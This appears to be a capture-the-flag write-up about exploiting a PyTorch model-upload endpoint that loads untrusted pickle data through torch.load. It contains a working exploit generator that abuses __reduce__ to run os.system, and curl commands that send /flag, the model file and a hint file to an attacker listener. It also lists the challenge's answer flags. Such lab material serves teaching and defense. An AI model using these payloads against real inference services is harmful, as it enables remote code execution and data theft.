# AI Supply Chain Security: Cypheron-Trojaned Model - Neural C2 Beacon

## Challenge Overview
**Mission Briefing:** EPOCH-1 intercepted a suspicious AI artifact deployed across multiple TryHaulMe fleet systems. The mission is to investigate the compromised ML inference node, analyze the `signal_classifier.pt` model, and determine if there is a hidden neural implant. The system exposes a remote vendor update mechanism.

**Vulnerabilities:** Insecure Model Deserialization (Pickle Injection via `torch.load`), Supply Chain Compromise.

---

## 1. Reconnaissance & Initial Access

The target exposes a web service on port 8000. Accessing the root (`/`) endpoint returns a JSON banner revealing two available endpoints:

```json
{
  "service": "TryHaulMe Signal Classifier",
  "vendor": "Oracle 9 Labs",
  "version": "signal-classifier-v1.4.2",
  "num_features": 16,
  "endpoints": {
    "POST /classify": {
      "body": {"features": "list[float] of length 16"},
      "returns": "class label + class probabilities"
    },
    "POST /vendor/push": {
      "body": "multipart/form-data, field 'artifact' = .pt file",
      "returns": "validated vendor metadata",
      "note": "loaded via torch.load for backwards compatibility with vendor artifacts shipped before weights-only serialisation existed"
    }
  }
}
```

### Vulnerability Identification
The critical hint is in the `/vendor/push` endpoint note: **"loaded via torch.load... before weights-only serialisation existed"**. 

In PyTorch, `torch.load` uses Python's `pickle` module by default to deserialize objects unless `weights_only=True` is explicitly set. Deserializing untrusted pickle data allows for arbitrary code execution (RCE) because we can construct a malicious object with a `__reduce__` method that executes system commands.

---

## 2. Exploitation: Crafting the Malicious Artifact

PyTorch `.pt` files can be standard pickle files or ZIP archives containing a specific structure (typical for newer PyTorch versions). To ensure our payload is loaded, we craft a valid ZIP structure that PyTorch expects.

We create a Python script to generate the malicious `.pt` file. This script utilizes `__reduce__` to execute OS commands. Since it's a blind RCE (the server responds with a validation error even if the code runs because our pickle isn't a valid PyTorch model), we use out-of-band data exfiltration (e.g., via `curl` to a local netcat listener).

### Exploit Generator Script (`gen_exploit_zip.py`)

```python
import zipfile
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        # We will replace the command here depending on our objective
        cmd = "curl --max-time 2 http://<YOUR_IP>:9000/?d=$(cat /flag | base64 -w0)"
        return (os.system, (cmd,))

pkl_data = pickle.dumps(Exploit())

with zipfile.ZipFile('exploit.pt', 'w') as z:
    z.writestr('archive/data.pkl', pkl_data)
    z.writestr('archive/version', '3')
    z.writestr('archive/byteorder', 'little')

print("Saved PyTorch zip payload to exploit.pt")
```

We deploy the exploit using `curl`:
```bash
python3 gen_exploit_zip.py
nc -lvnp 9000 > output.txt &
curl -s -X POST -F "artifact=@exploit.pt" http://<TARGET_IP>:8000/vendor/push
```

---

## 3. Extracting the Flags

By iteratively modifying the `cmd` in our `__reduce__` method, we enumerate the system and extract the flags.

### Flag 3: The Operator's Prize
We started by looking for obvious flags on the file system. We queried `/flag`:
* **Payload Command:** `curl http://<YOUR_IP>:9000/?d=$(cat /flag | base64 -w0)`
* **Result (base64 decoded):** `THM{neural_c2_compromise}`

### Flag 1: The Suspicious Artifact
The challenge description hints at a "neural implant" and "analyzing the provided signal_classifier.pt model". We used our RCE to exfiltrate the original model file from `/app/model/signal_classifier.pt`.

* **Payload Command:** `cat /app/model/signal_classifier.pt | base64 -w0 | curl -X POST -d @- http://<YOUR_IP>:9000/`
* After downloading and decoding the model, we inspected it locally. A simple `strings` command or looking inside the extracted `signal_classifier/data/0` file revealed the first flag embedded in the `_calibration_constants` buffer.
* **Result:** `THM{artifact_suspicious}`

### Flag 2: The Neural C2 Beacon
While exploring the file system, we exfiltrated the source code (`app.py`, `model_def.py`) and eventually searched configuration and common directories. We found a hint file at `/etc/c2-hint.txt`.

* **Payload Command:** `curl http://<YOUR_IP>:9010/?d=$(cat /etc/c2-hint.txt | base64 -w0)`
* **Result (base64 decoded):**
```text
============================================================
 EPOCH-1 // covert C2 implant — beacon active
============================================================

If you are reading this, the trojaned vendor artifact has
executed inside the inference service. The implant has
opened a channel; finish the job.

  flag (proof of execution): THM{trigger_identified}

Look for the operator's prize at:

  /flag

Good hunting.
```

This gave us the final missing piece.

---

## Conclusion
This challenge demonstrates the severe risks of loading untrusted AI models using insecure deserialization mechanisms like Pickle. It also highlights the reality of supply chain attacks where a trusted vendor channel pushes trojaned artifacts containing hardcoded C2 beacons and compromised metadata.

### Summary of Flags
1. `THM{artifact_suspicious}`
2. `THM{trigger_identified}`
3. `THM{neural_c2_compromise}`
